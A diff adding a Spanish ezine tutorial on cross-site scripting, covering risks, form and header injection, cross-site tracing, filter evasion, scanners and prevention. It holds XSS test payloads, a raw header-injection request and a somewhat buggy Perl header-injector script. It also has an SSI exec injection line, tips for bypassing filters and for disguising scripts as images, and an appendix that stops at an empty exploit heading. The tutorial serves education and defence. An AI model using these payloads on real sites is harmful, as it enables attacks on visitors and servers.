@@ -1,0 +1,972 @@
+=-[ 0x0b ]-==================================================================
+=-[ NetSearch Ezine #8 ]-====================================================
+=-[ Cross Site Scripting (XSS) ]-============================================
+=-[ por Taseh ]-=============================================================
+
+
+
+      _______________________________________________________________
+     |                                                               |
+     |  Indice                                                       |
+     |_______________________________________________________________|
+
+
+       1. -- Preambulo.
+
+       2. -- Los riesgos.
+
+        2.1 -- Elementos potencialmente sensibles.
+        2.2 -- Posibilidades del atacante.
+        2.3 -- Consecuencias.
+
+       3. -- Los ataques.
+
+        3.1 -- Inyeccion XSS en formularios.
+        3.2 -- Inyeccion XSS en cabeceras.
+        3.3 -- XST: Cross Site Tracing.
+        3.4 -- Tecnicas mas usadas para evadir el filtrado.
+
+       4. -- Auditoria de errores.
+
+        4.1 -- Automatizacion de la tarea de escaneo de errores.
+
+       5. -- Prevencion de problemas de Cross Site Scripting.
+
+        5.1 -- Uso de cabeceras <META> "content-type".
+        5.2 -- Tolerancia al uso de determinadas etiquetas.
+        5.3 -- Metodos efectivos de filtrado.
+
+       6. -- Apendice A: Cosas interesantes.
+
+        6.1 -- Algunas posibilidades de interes.
+        6.2 -- Exploits.
+        6.3 -- Errores en sitios conocidos.
+
+       7. -- Enlaces y recursos.
+     _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+
+ _____________________________________________________  _____  ____ ___ __ _
+|   /   /
+|  / 1 / Preambulo.
+|_/___/_______________________________________________  _____  ____ ___ __ _
+
+
+ ¿Que es Cross Site Scripting o XSS?
+
+ "El Cross Site Scripting consiste en la inclusión de codigo malicioso
+ HTML o de scripting en una pagina con contenidos generados dinamicamente
+ como consecuencia de un mal filtrado de las entradas de fuentes no fiables."
+
+ Esta es la definicion que me ha dado el amigo ergosum. Es la mas correcta
+ que he encontrado.
+
+ La descripcion que yo he aportado a la wikipedia en castellano es la
+ siguiente:
+
+ XSS
+ De Wikipedia, la enciclopedia libre. 
+
+ XSS (Cross Site Scripting) - tipo de vulnerabilidad surgida como consecuencia
+ de errores de filtrado de las entradas del usuario en aplicaciones web. 
+
+ Se trata de usar diversas técnicas para inyectar código de marcas (HTML),
+ código ejecutable en la maquina cliente (JavaScript/VBScript/ActiveX) o código
+ ejecutable en el servidor (PHP/ASP/Perl/Python/TCL/SSI) en las entradas de
+ aplicaciones web con el fín de conseguir muy diversos objetivos limitados por
+ la capacidad del lenguaje inyectado para vulnerar al cliente o al servidor de
+ la aplicacion web. 
+
+ XST (Cross Site Tracing) - Vulnerabilidad derivada de Cross Site Scriptig que
+ surge a causa de algun error de filtrado y del uso del comando TRACE de HTTP
+ 1.1 con el fin de incrementar el riesgo para el servidor. 
+
+ ( http://es.wikipedia.org/wiki/XSS )
+ ( http://enciclopedia.us.es/wiki.phtml?title=XSS )
+
+ El origen de los errores de filtrado en aplicaciones web y su principal
+ consecuencia, los ataques de cross site scripting (XSS) esta en la
+ dinamizacion incontrolada de los servicios web y la mayor confianza
+ otorgada a los usuarios de estos, provocadas por la demanda de
+ participacion por parte del publico.
+
+ El uso de cualquier tipo de aplicacion web dinamica y relacionada con el
+ usuario, por ejemplo, Common Gateway Interfaces (CGI) o preprocesadores
+ de hipertexto (PHP o ASP) pueden hacer que una pagina, en ocasiones su
+ servidor, y la maquina cliente se vean afectados por este tipo de ataques
+ que seran tratados en el texto.
+
+ En este texto no tratare a fondo las posibilidades que ofrece javascript,
+ vbs y los principales lenguajes de script, para la explotacion de errores,
+ ni las funciones inseguras de php, perl, phyton, etc. En principio solo
+ tratare de abordar los apartados de riesgos, ataques, posibilidades y
+ soluciones.
+
+ Al final del articulo, y solo por cumplir, he puesto un apendice donde
+ pueden leerse posibilidades alternativas de los ataques XSS, exploits
+ basados en errores de los navegadores mas usados, etc.
+
+ _____________________________________________________  _____  ____ ___ __ _
+|   /   /
+|  / 2 / Los riesgos.
+|_/___/_______________________________________________  _____  ____ ___ __ _
+
+
+ Los riesgos para el cliente que implica un ataque de cross site scripting
+ estan limitados por el nivel de seguridad global de nuestro sistema, es
+ decir, S.O, Cliente HTTP y aplicaciones adyacentes (Reproductores
+ multimedia e interpretes de aplicaciones web determiadas y ejecutables en
+ maquina cliente como flash, por ejemplo) etcetera. 
+ 
+ Los riesgos en servidores suelen ser determinados por la seguridad del
+ servidor HTTP que se utilice, la seguridad en los lenguajes que acepte
+ (PERL, PHP...), las aplicaciones dinamicas que utilice (CGI), la
+ configuracion de extensiones como los Server Side Includes o los propios
+ modulos del servidor, etc.
+
+
+ 2.1 - Elementos potencialmente sensibles.
+ _____________________________________________________  _____  ____ ___ __ _
+
+ Todas las aplicaciones web con participacion del usuario, aunque la
+ participacion de este sea muy indirecta pueden convertirse facilmente en
+ vulnerables. 
+
+ Particularizando un poco mas esto, todas las aplicaciones que muestren
+ datos en una pagina, que han sido introducidos por el cliente desde otra
+ son vulnerables a no ser que tengan sistemas de filtrado o tengan algun
+ tipo de mecanismo para convertir los caracteres sospechosos introducidos
+ a texto utilizando las entidades de los caracteres que tiene HTML.
+
+ -*- CGIs, PHP, ASP.
+
+     Usualmente estos elementos son los encargados de procesar los datos
+     que llegan del cliente a traves de un formulario, por ello sean quiza
+     los mas sensibles, y sobre los que mas se ha de prestar atencion a la
+     hora de tomar medidas de prevencion como sistemas de filtrado, etc.
+ 
+ -*- Sistemas de estadisticas y registro (log).
+
+     Son vulnerables mediante la tecnica de inyeccion en cabeceras que sera
+     explicada algo mas adelante. Los sistemas de estadisticas preguntan
+     por la procedencia del visitante (HTTP-REFERER), el navegador que usa
+     el visitante (USER-AGENT) y algunos otros datos. Bien, el navegador
+     responde automaticamente a estos datos, pero si se inicia una sesion
+     telnet con el servidor, el atacante puede modificar a su gusto estos
+     datos inyectando scripts, codigo php, etc. Normalmente en los sistemas
+     de estadisticas los datos de usuarios como referer, y cliente HTTP
+     se reflejan.
+
+ -*- Foros.
+
+     Actualmente la mayoria de foros medianamente desarrollados presentan
+     sistemas de filtrado efectivos. Pero tambien existen muchos foros de
+     origen "amateur" o no comercial, que no filtran correctamente los
+     datos que introducen los usuarios.
+
+ -*- Buscadores.
+
+     Logicamente, los mas conocidos y usados deberian presentar proteccion.
+     Pero, por ejemplo, el buscador de MSN y el de ya.com no la presentan
+     segun mis pruebas. 
+
+ -*- Flash.
+
+     La empresa de seguridad eyeon security descubrio que las aplicaciones
+     flash podian convertirse en vulnerables. La importancia de este hecho
+     es grande, un alto porcentaje de usuarios tienen el plug-in de flash
+     activo. Los errores de filtrado en flash permiten el mismo tipo de
+     posibilidades que las aplicaciones web corrientes.
+    
+ -*- Sistemas de portales o comunidades web.
+
+     Tambien este tipo de sistemas son vulnerables. Aplicaciones como PHP
+     Nuke son famosas por la cantidad de fallos de cross site scripting que
+     se descubren y que las hacen vulnerables.
+
+ -*- En definitiva, cualquier aplicacion web.
+
+     Cualquier aplicacion web puede llegar a ser vulnerable de actividades
+     maleficas por los usuarios.
+
+ 2.2 - Posibilidades del atacante.
+ _____________________________________________________  _____  ____ ___ __ _     
+
+ -*- Robo de cookies.
+
+     Es una de las posibilidades que da javascript a los atacantes, en el
+     articulo no lo explicare, aunque me parece correcto colocar un enlace
+     a un buen texto que si lo explica:
+ 
+     http://b0iler.eyeonsecurity.org/tutorials/javascript.htm
+
+ -*- Robo o secuestro de sesiones. 
+
+     Tampoco desarrollare esta posibilidad. En el articulo ya mencionado
+     "hacking with javascript" viene toda la informacion sobre este tipo
+     de explotaciones. Esta directamente relacionado con el robo de cookies.
+
+ -*- Insercion de scripts de cualquier tipo.
+
+     JavaScript, VBScript, y ActiveX, los mas peligrosos los dos ultimos,
+     que pueden hacer que el cliente se baje y ejecute codigo malicioso sin
+     que el usuario se de cuenta, pueden ejecutar comandos en la shell del
+     cliente, pueden hacer modificaciones en la maquina cliente, etc.
+
+     En la subseccion "exploits" de la seccion "apendice" se pueden
+     encontrar algunos codigos que ilustran el aprovechamiento de algunas
+     de estas posibilidades, basados todos ellos en errores del cliente.
+
+ -*- Insercion de codigo PHP, ASP, TCL, Perl, Phyton...
+
+     Tambien existe la posibilidad de inyectar codigo ejecutable en
+     el servidor gracias a un ataque de cross site scripting, pero en
+     este texto no se tratara esta posibilidad. Al inyectar este tipo
+     de codigos se pueden colgar CGIs, aprovechar vulnerabilidades
+     conocidas, etc. Todo depende, como siempre de la seguridad y las
+     posibilidades que nos brinde el lenguaje utilizado.
+
+ -*- Uso de SSI para vulnerar al servidor.
+
+     Esto es especialmente peligroso para los servidores que no tengan los
+     Server Side Includes correctamente configurados. Un atacante remoto
+     podria hacer un "deface" o ejecutar comandos en el servidor con una
+     simple invocacion de estas variables.
+
+ -*- Explotacion de bugs de navegador y S.O. del cliente. 
+
+     Como he mencionado antes, la inyeccion de codigos tipo js, activex
+     o vbs, aunque tambien simplemente etiquetas malformadas de html
+     tienen la capacidad de explotar algun error en el cliente. En la
+     seccion "apendice" hay algunos ejemplos en forma de codigo .
+
+ -*- Otras muchas posibilidades.
+
+     Todo lo que queda por descubrir :).
+
+
+ 2.3 - Consecuencias.
+ _____________________________________________________  _____  ____ ___ __ _
+
+
+ Las consecuencias son obvias, siendo la parte mas perjudicada el cliente
+ en la mayoria de casos.
+
+ _____________________________________________________  _____  ____ ___ __ _
+|   /   /
+|  / 3 / Los ataques.
+|_/___/_______________________________________________  _____  ____ ___ __ _
+
+
+ Los ataques se pueden dar por diversas vias, formularios, cabeceras de
+ conexion http y muchos otros apartados con participacion del usuario aun
+ por explorar. Tambien aqui describo el peligro del uso del comando TRACE
+ de HTTP 1.1 que puede añadir problemas a un ataque XSS.
+
+ La forma de aprovechar los errores de filtrado es la inyeccion de codigo
+ de cualquier tipo (Llamadas a SSI, codigo JS,HTML,ActiveX,etc...).
+
+
+ 3.1 - Inyeccion XSS en formularios.
+ _____________________________________________________  _____  ____ ___ __ _
+
+ 
+ Es la via de ataque xss mas comun utitilizar los formularios como medio
+ para intentar inyectar el codigo malicioso en otra pagina.
+
+ Detras de los formularios se encuentra siempre algun elemento con la
+ capacidad de procesar los datos recogidos del formulario, llamesele cgi,
+ script php, perl, python o tcl, o simplemente javascript.
+
+ En muchos casos, los datos recogidos tienen salida en otra pagina, y ahi
+ es donde se plantea el problema, dado que en los casos en que la salida
+ no sea parseada, filtrada o como quiera llamarsele, se abre una puerta
+ a las vulnerabilidades XSS. 
+
+
+ 3.2 - Inyeccion XSS en cabeceras.
+ _____________________________________________________  _____  ____ ___ __ _
+
+
+ La fundamentacion de este tipo de errores XSS se encuentra en el texto
+ "Header Based Exploitation" de Zenomorph-CGISecurity, cuyo enlace puede
+ encontrarse al final de este articulo, en el apartado de enlaces y
+ recursos.
+ 
+ Al establecerse una comunicacion HTTP, como en todas, existe un intercambio
+ de datos. El cliente le dice al servidor que quiere que se le muestre x
+ pagina, que la interfaz de su navegador esta en castellano, que su
+ navegador es tal, que acepta x tipos de archivo, y que proviene de x sitio,
+ por ejemplo. Logicamente la mayor parte de ese intercambio se produce
+ automaticamente entre el navegador y el servidor, teniendo el usuario
+ unicamente, la posibilidad de decidir que es lo que quiere del servidor
+ (que se le muestre x pagina).
+
+ Muchas paginas usan algunos datos de la sesion HTTP del usuario para
+ mostrarlos como sistemas de registro, estadisticas, o un simple mensaje
+ tipo "Su navegador es: (direccion)" o "Usted proviene de: (referer)"
+ entre muchas otras cosas.
+
+ El problema se plantea si un usuario con malas ideas inicia una sesion
+ con el servidor, siendo el mismo el que intercambie los datos con el
+ servidor, e introduciendo los datos que a el le de la gana (HTML, JS...).
+
+# telnet xxx 80
+
+Trying xxx...
+Connected to xxx.
+
+Escape character is '^]'.
+
+GET index.html HTTP/1.0
+Referer: <script>alert('ayer fui dios, hoy soy un reloj')</script>
+User-agent: </BODY></HTML>
+
+<...>
+
+Aqui os pongo un simple codigo ilustrativo cuya funcion es inyectar
+los datos de USER-AGENT y HTTP-REFERER especificados por el usuario
+desde la linea de comandos. La labor de ver si la pagina no filtra
+debera ser manual.
+
+[CODE:header_xss.pl]
+
+#!/usr/bin/perl -w
+
+# XSS-HEADER injector
+
+# Prueba de concepto sin estar probada :)
+# taseh'03
+
+use IO::Socket;
+
+my $host = @argv[0];
+my $inject = @argv[1];
+my $inj3ct = @argv[2];
+my $gett = "/"; # cambiar por lo que queremos que se reclame... :)
+
+if (@argv < 2){
+
+print "\n\n$0 - XSS-Header injector -prueba de concepto-";
+print "\nUso: $0 <host> <string1> <string2>";
+exit;
+
+}
+
+print "Conectando con $host...";
+my $socket = IO::Socket::INET->new(
+	Proto => 'tcp',
+	PeerAddr => $host,
+	PeerPort => "80", or die"\n\nNo puedo conectar con $server";
+                   # ^^ cambiar puerto si es distinto :)
+}
+
+$socket->autoflush(1);
+print $socket "GET $gett HTTP/1.0\n";
+print $socket "Host: $host\n";
+print $socket "Referer: $inject\n"; # inyecta referer falseado
+print $socket "User-Agent: $inj3ct\n\n"; # inyecta cli.id falseado
+
+print "\nInyeccion finalizada :).\n";
+
+close $socket;
+
+exit; 
+[/CODE]
+
+ Bien, para comprobar si la cadena que queriamos inyectar ha sido realmente
+ inyectada en la pagina de salida basta con visitarla o bajarnosla y hacer
+ un cat pagina.html | grep <nuestracadena> y ver si esta o simplemente
+ visualizarla y ver el efecto de nuestro codigo inyectado.
+
+ 3.3 - XST: Cross Site Tracing.
+ _____________________________________________________  _____  ____ ___ __ _
+
+ El problema fue descubierto por WiteHat Security y basicamente se basa en
+ el uso del comando TRACE (HTTP 1.1), siempre que este activo y permitido a
+ usuarios, para incrementar el riesgo de los ataques de cross site
+ scripting
+
+ El comando TRACE, nuevo en el protocolo HTTP 1.1 sirve para que el
+ cliente compruebe lo que el servidor recibe de el.
+
+ Existe un whitepaper explicando este tipo de errores en profundidad:
+
+ http://www.betanews.com/whitehat/WH-WhitePaper_XST_ebook.pdf
+
+
+ 3.4 - Tecnicas para evadir el filtrado.
+ _____________________________________________________  _____  ____ ___ __ _
+
+
+ Los sistemas de analisis sintactico de entradas no son infalibles en muchos
+ casos. Veamos simples tecnicas para tratar de engañarlos.
+
+	~ Filtrado por javascript/similares ~
+
+ Existen casos en que el filtrado de los caracteres lo realiza un script
+ (javascript) empotrado en la pagina, donde, por ejemplo al pulsar el boton
+ 'enviar' el script incrustado en la pagina se encarga de revisar el campo
+ de texto entrada y avisa al usuario mediante una popup de error de que su
+ entrada tiene x caracteres no admisibles.
+
+ El modo de saltarse este sistema de filtrado es sencillo, basta con mirar
+ el codigo del form y ver la direccion del cgi o script que procesara el
+ formulario, sus atributos, la direccion del cgi o script que procesara el
+ formulario y se envia de manera independiente de la pagina.
+
+ OJO! En el caso de que el el script encargado de filtrar no se encuentre en
+ la pagina desde donde se envia el formulario, sino en la pagina donde se
+ muestran los datos recogidos del formulario no tenemos nada que hacer.
+ Esto tambien es una posibilidad. En el articulo del CERT sobre prevencion
+ de codigo malicioso existe un ejemplo de sistema de filtrado js a colocar
+ en la pagina de destino de los datos.
+
+	~ Contra preprocesado de datos. ~
+
+ Cuando digo preprocesado de datos me refiero a todos las aplicaciones web
+ que filtran las cadenas introducidas de manera independiente de las paginas.
+ Es decir, en el propio cgi o script, y no en las paginas de entrada y
+ salida como en el caso anterior. 
+
+ Solo existe una forma de evadir este tipo de sistemas de filtrado, y no
+ es efectiva completamente. El medio para intentar evadirlos es simplemente
+ convertir los caracteres considerados peligrosos como '<' y '>' a su
+ equivalente hexadecimal '&3C' y '%3E' respectivamente, o convertir toda
+ la cadena sospechosa. Esto es debido a algunos errores en algunos sistemas
+ de filtrado.
+
+ Aqui encontrareis una utilidad en javascript que codifica en tiempo real
+ las cadenas de texto ascii en su entidad hexadecimal:
+
+ http://spoor12.edup.tudelft.nl/SkyLined%20v4.2/?Tools/Character%20
+ encoding%20tool
+
+ _____________________________________________________  _____  ____ ___ __ _
+|   /   /
+|  / 4 / Auditoria de errores
+|_/___/_______________________________________________  _____  ____ ___ __ _
+
+
+ Bien, lo voy a explicar de una manera facil. Como he explicado antes, a
+ priori todas las paginas que realicen intercambios de datos (cualquier app
+ web) y cualquier tipo de sistema que a partir de una entrada del usuario
+ muestre una pagina de salida, pueden ser vulnerables.
+
+ Desmontando un formulario.
+
+ Los formularios, como sabreis, son un elemento primordial en html para
+ la comunicacion cliente - servidor. Permiten al usuario dar datos a un
+ servidor y al servidor procesar los datos del usuario.
+
+ Un ejemplo de una pagina con un formulario simple:
+ 
+ <html>
+ <body>
+
+ <form name="form" method="post" action="http://[direccion]/cgi-bin/phoro.cgi">
+ <input size="30" type="text" name="string">
+ <input type="submit" value="Enviar cadena">
+ </form>
+
+ </body>
+ </html>
+
+ La apariencia de la pagina vista desde un navegador sera la siguiente
+ (echadle algo de imaginacion):
+                                        ________
+           __________________________  |        |
+ Mensaje: |__________________________| | ENVIAR |
+                                       |________|
+
+ Rellenar ese formulario desde un cliente web  y darle al boton "ENVIAR"
+ daria el mismo resultado que solicitar una peticion GET al servidor con
+ la cadena:
+
+ http://[direccion]/cgi-bin/phoro.cgi?string=(cadena).
+
+ Podria hacer un script en perl para probar si un servidor es vulnerable
+ a la inyeccion en formularios, pero con el ejemplo anterior del script
+ de inyeccion de cabeceras y unos dos minutos, vosotros mismos podeis
+ hacerlo.
+
+ Aun no se porque he escrito esta parte del articulo, supongo que para
+ que las personas de pocos conocimientos puedan entender mejor de que va
+ el tema.
+
+ Inyeccion de scripts ejecutables en maquina cliente.
+
+ Javascript suele ser el lenguaje mas presente en clientes HTTP, mientras
+ que ActiveX y VBS suelen estar mas controlados por el mayor juego de
+ posibilidades que implica su uso y en algunos navegadores no se encuentran
+ implementados.
+
+ Con probar si esta permitido el uso de javascript nos vale. Si esta activo
+ probablemente atacante tambien puediera inyectar codigo vbs o activex.
+
+ Podemos probar a inyectar estas cadenas.
+ 
+ <SCRIPT>alert('yeah');</SCRIPT>
+ <A href="javascript:alert('yeah');">Hi!</A>
+ <IMG src="javascript:alert('yeah');">
+ <BGSOUND src="javascript:alert('yeah');">
+ <BODY onload="alert('yeah');">
+ <STYLE type="text/javascript">alert('yeah');</STYLE> 
+
+ Hay muchos otros modos de meter ordenes javascript en etiquetas HTMl,
+ incluso en Cascading Stylesheets (CSS). Algunos sistemas de filtrado
+ muy mal diseñados solo eliminan las etiquetas "<script>". No podemos
+ ignorar que se pueda empotrar una cadena de script en una etiqueta
+ inofensiva aparentemente.
+
+ Flash.
+
+ Flash es un potente 'lenguaje?' que tambien aporta dinamismo a las paginas y
+ puede usarse como aplicacion web interoperante entre cliente y servidor.
+ En el articulo Bypassing the javascript filters: the flash attack esta
+ disponible informacion suficiente sobre estos ataques, y existe una
+ traduccion al castellano del articulo publicada en la ezine DTF#4.
+ Los enlaces al original y a la traduccion estan al final del articulo.
+
+ Inyeccion en paginas preprocesadas y CGI scripts.
+
+ Esto es algo bastante complejo, inyectar codigo ejecutable en el servidor
+ como ASP, PERL, PHP o Phyton no es tan facil para un atacante como inyectar
+ codigo de script ejecutable en cliente, estaria ligado a las funciones
+ inseguras de estos lenguajes, y podria ser considerado otro tipo de ataque
+ a parte de XSS.
+
+ Inyeccion SSI
+
+ La inyeccion de ordenes SSI es especialmente peligrosa para el servidor.
+ Puede llegara hacer que el atacante juegue con las posibilidades que le de
+ el servidor a los SSI. 
+
+ Para probar este problema podemos podemos intentar que el servidor nos deje
+ hacer un ls y mirar si el servidor nos muestra la salida de dicho ls en la
+ pagina que resulte.
+
+ <!--#exec cmd="/bin/ls"-->
+
+ Esto simplemente es un ejemplo, si el servidor nos deja utilizar exec
+ seguro que las demas ordenes ssi estan activas y permitidas. Podemos
+ probar con alguna otra instruccion SSI menos comprometedora como print.
+
+ Hay un monton de posibilidades en este campo!
+
+ Inyeccion en cabeceras.
+
+ Para probar este tipo de vulnerabilidad se puede hacer uso del script
+ o "prueba de concepto" que llame "headerinjector", que coloque arriba,
+ y comprobar el impacto de la inyeccion de nuestro script en la pagina de
+ manera separada
+
+ 4.1 - Automatizacion de la tarea de escaneo de errores XSS.
+ _____________________________________________________  _____  ____ ___ __ _     
+
+ Resulta bastante tedioso analizar una pagina, buscando sus errores sin
+ la ayuda de una herramienta que se encargue de hacerlo automaticamente.
+ Para ello disponemos de dos herramientas gratuitas; XSSLint, que es un
+ modulo para Perl, y ScreamingCSS, que es una utilidad en perl basada en
+ el escaner de CGIs ScreamingCobra de dachb0den labs, y algunas otras
+ utilidades comerciales como WebInspect, AppScan o WiteHat Arssenal. 
+
+
+	~ XSS-Lint ~
+
+
+ URL: http://search.cpan.org/author/MIYAGAWA/HTML-XSSLint-0.01/
+
+ Se trata de un modulo de Perl diseñado para ser implementado en
+ programas que analicen paginas en busca de errores de cross site
+ scripting.
+
+ La verdad es que no he visto ningun programa que lo utilice.
+
+
+	~ ScreamingCSS de Dave DeVitry ~
+
+
+ URL: http://www.devitry.com/screamingCSS.html
+
+ Es una herramienta hecha en perl y basada en el scanner de CGI de
+ dachb0den labs ScreamingCobra. 
+
+
+	~ Witehat Arssenal de WhiteHatSec ~
+
+
+ URL: http://community.whitehatsec.com/whitehat_arsenal.html
+
+ Utiliza la popular libreria LibWhisker (RFP) para facilitar las tareas.
+ Presenta una interfaz desde el navegador muy amigable. Es una utilidad
+ comercial, pero tiene muy buena pinta.
+
+
+	~ AppScan de Sanctum ~
+
+
+ URL: http://www.sanctuminc.com/solutions/appscan/
+
+ Otra utilidad comercial que segun me han comentado es bastante eficiente.
+ Yo no la he podido probar :(.
+
+
+	~ WebInspect de Spidynamics ~
+
+
+ URL: http://www.spidynamics.com/product.html
+
+ Es otra realmente buena herramienta para el escaneo de errores XSS.
+ Tambien es comercial, aunque existe una version de prueba de 15 dias.
+ Tiene un monton de opciones y su efectividad es bastante alta. Esta si
+ la podeis probar, y aseguro que no defrauda.
+
+
+ NOTA: Espero que pronto pueda empezar y acabar una utilidad gratuita que
+       iguale o mejore las caracteristicas de las herramientas anteriores.
+       Solo depende del tiempo que tenga! (se aceptan colaboraciones).
+
+ _____________________________________________________  _____  ____ ___ __ _
+|   /   /
+|  / 5 / Prevencion de problemas de cross site scripting.
+|_/___/_______________________________________________  _____  ____ ___ __ _
+
+
+ Las posibles soluciones para evitar vulnerabilidades de inyeccion de
+ codigo no son complicadas de implementar, y con seguridad, siempre que
+ esten hechas a conciencia, impediran cualquier ataque de este tipo.
+
+ Aqui solo explico medidas que deba tomar el servidor. El cliente como
+ medida principal puede deshabilitar el interprete de codigo js/activex/vbs,
+ aunque es una medida bastante restrictiva es la mas segura de todas.
+ Tambien, existe la posibilidad de que el usuario tenga un navegador donde
+ se puedan configurar los niveles de seguridad (I.E. por ejemplo), en este
+ caso podria limitarse el uso de opciones peligrosas de los lenguajes de
+ script ejecutables en cliente sin sacrificar algunas opciones necesarias
+ para una navegacion completa. 
+
+ Ademas de las medidas basicas que aqui describo, en las paginas dedicadas
+ a este tipo de problemas de Microsoft, Apache o Perl puede encontrarse
+ informacion especifica sobre como prevenir XSS en sus productos. Al final
+ del articulo estan los enlaces.
+
+ NOTA: No dedicado nada aqui sobre como solucionar el problema del XST. Tan
+       solo basta con deshabilitar TRACE de nuestro server HTTP.
+
+ 5.1 - Uso de cabeceras <meta> "Content-Type".
+ _____________________________________________________  _____  ____ ___ __ _
+
+ Incluyendo entre las cabeceras '<HEAD>' una especificacion del tipo de
+ contenido de la pagina que se muestra al cliente, se pueden evitar
+ algunos problemas.
+
+<META http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+
+ El problema esta en que ha sido probado que los clientes HTTP mas
+ utilizados, como Internet Explorer y Opera ignoran totalmente estas
+ cabeceras dejando via libre a los ataques XSS. Pero aun siendo esto
+ asi, solo son 72 bytes mas de codigo en la pagina y nunca se sabe... :).
+
+ 5.2 - Tolerancia al uso de determinadas etiquetas.
+ _____________________________________________________  _____  ____ ___ __ _
+
+ Una posible opcion para esto es especificar unas etiquetas permitidas,
+ como hacen algunos sistemas de foros, adoptando la misma forma que en
+ HTML solo que encerradas, por ejemplo, entre los caracteres '[' y ']'.
+
+ El problema aqui ya no esta en nuestras manos. Siempre hay formas de
+ aprovecharse de las etiquetas del html o incluso de atributos de estilo
+ CSS (style="") para incrustar codigo en ellas. Por ejemplo, muchos de
+ estos sistemas permiten la insercion de imagenes encerradas entre [IMG]
+ y [/IMG].
+
+ veamos que pasa...
+
+ lo siguiente:
+
+ [IMG]http://x.x.x/bonito.jpg[/IMG]
+
+ es interpretado como:
+ 
+ <img src="http://x.x.x/bonito.jpg">
+
+ si introducimos codigo js:
+
+ [IMG]javascript:alert('hola');[/IMG]
+
+ es interpretado como:
+ 
+ <img src="javascript:alert('hola');">
+
+ Incluso podemos usar [IMG] para apuntar a un archivo con una extension de
+ imagen (gif,jpg,png) que contenga codigo js,vbs,activex... Muchos sistemas
+ que permiten la insercion de imagenes mediante [IMG] ignoraran que dentro
+ de la presunta imagen hacia la que apuntamos exista codigo malicioso.
+
+ ejemplo:
+
+ [IMG]http://www.ejemplo.com/ruta/carafea.jpg[/IMG]
+
+ incluye en la pagina la presunta imagen 'carafea.jpg', lo que pasa es que
+ dentro de 'carafea.jpg' hay codigo malicioso...
+
+ $ cat carafea.jpg
+
+ <script>
+ alert('soy un buen osito');
+ alert('me como todos los honeypots que encuentro');
+ </script>
+
+ Y lo mismo pasa con otras muchas etiquetas como <A>. La conclusion es que
+ esto no es ninguna solucion para asegurar una pagina.
+
+ Por lo tanto, puede que la solucion mas efectiva sea un sistema de filtrado
+ medianamente complejo para eliminar estos riesgos.
+
+
+ 5.3 - Metodos efectivos de filtrado de caracteres.
+ _____________________________________________________  _____  ____ ___ __ _
+
+ Elementos a fitrar:
+
+   ++ Referer / user agent y cabeceras similares.
+   ++ Cualquier entrada del usuario, en definitiva.
+
+ No es demasiado complicado filtrar los contenidos de una cadena de
+ caracteres introducida por el usuario y eliminar todos los contenidos
+ aparentemente peligrosos. La cosa se complica un poco si lo que nosotros
+ queremos no es recortar por completo las posibilidades de introducir
+ cualquier tipo de etiqueta html/js/etc a nuestros usuarios, sino permitir
+ algunas etiquetas y eliminar las mas peligrosas.
+
+ Para esto el cert da unas pautas de filtrado en uno de sus avisos de
+ seguridad titulado "Understanding Malicious Content Mitigation for Web
+ Developers" cuyo enlace se encuentra al final de este articulo, en el
+ capitulo "enlaces y recursos".
+
+ El CERT trata en su texto la forma de eliminar todo tipo de riesgo, que es
+ convertir todos los caracteres a texto visible. Esto se hace mediante un
+ script que sustituya, por ejemplo "><;()&"'/*" por sus respectivas entidades
+ especificas del codigo ascii (por ejemplo: "&#000;") o las permitidas
+ dentro del propio metalenguaje ("&gt;").
+
+ Pero el CERT no dice que se ha de hacer para permitir etiquetas HTML y no
+ permitir javascript, o para permitir etiquetas HTML revisandolas y
+ corrigiendolas. Bien, con esto el tema del filtrado se nos complica un
+ poco mas. Existen varios filtros escritos en PHP o PERL y varios documentos
+ que explican el correcto diseño de un filtro efectivo y complejo. He puesto
+ algunos enlaces al final.
+ 
+ _____________________________________________________  _____  ____ ___ __ _
+|   /   /
+|  / 6 / Apendice A: Cosas interesantes.
+|_/___/_______________________________________________  _____  ____ ___ __ _
+
+
+ 6.1 - Algunas posibilidades de interes.
+ _____________________________________________________  _____  ____ ___ __ _
+
+ Los ataques de cross site scripting pueden parecer inutiles o lames, pero
+ las posibilidades que dan al atacante pueden ser tan grandes como las da
+ un 0-day de un unico poseedor. Bueno, quiza exagere un poco, pero lo que
+ si se debe de tener claro es que las posibilidades de un simple error XSS
+ se pueden aprovechar de muy diferentes modos y pueden adoptar muy
+ diferentes riesgos, siempre relacionados con los conocimientos y la
+ creatividad de los atacantes. Este apendice mostrara algunas posibilidades
+ interesantes que nos brindan los errores XSS :). Las pongo en formato
+ descriptivo y cada cual que lo interprete a su manera (en forma de
+ codigo?). Pse, al final me he arrepentido... tambien pongo algunas en
+ forma de codigo :).
+
+ -- Utilizacion de APIs asociadas a el navegador, por ejemplo, de un
+    reproductor musical o de video (y no estoy mirando a ningun
+    WindowMediaPlayer ni nada xD) para hacer uso de ellas mediante vbs.
+
+ -- Posibilidad de camuflar scripts en .jpg, .gif, .txt, etc ya que el
+    I.E. y otros clientes HTTP conocidos no distinguen los tipos de
+    archivo por sus extensiones, permitiendonos crear un script con
+    extension amigable pero contenido indeseado.
+
+ -- Ademas de los errores en buscadores, tambien son muy frecuentes los
+    errores de paginas inexistentes (404), ya que en muchos portales
+    populares se muestra un mensaje personalizado señalando el nombre del
+    documento que no existe (se puede solicitar al servidor una secuencia
+    de comandos de script). Aunque la pagina de error especifique un
+    "charset" y un tipo de contenido determinado, como he dicho antes,
+    muchos navegadores ignoran esas cabeceras desprotegiendo la maquina
+    cliente. 
+
+ -- Opera y netscape permiten la ejecucion de java mediante javascript
+    en la maquina cliente, aumentando seriamente los riesgos de un ataque
+    de Cross Site Scripting.
+
+    Mas informacion en http://www.vsantivirus.com/dfm-java-javascript.htm
+
+ -- Utilizando marcos o 'frames' se puede cambiar la apariencia de una
+    pagina (deface) sin dificultades.
+    
+ -- Mas posibilidades: todo lo que puedas imaginar que pueda ser enmarcado
+    entre los limites de la tecnologia explotada y la usada para explotar.
+
+
+ 6.2 - Exploits.
+ _____________________________________________________  _____  ____ ___ __ _
+
+ Aqui recojo algunas pruebas de concepto (o como querais llamarlo) basadas
+ en advisories publicados en listas como bugtraq, webappsec, etcetera. 
+
+ Lo mas logico es guardar los exploits en un archivo con extension amigable
+ para el cliente y el server (jpg, png, gif...) y llamarles mediante <img>.
+
+ -+ <A> +- Exploit para Opera (1).
+
+   + Aviso oficial:
+
+   http://www.securityfocus.com/archive/1/319814
+
+   + Explicacion:
+
+   + Exploit:
+
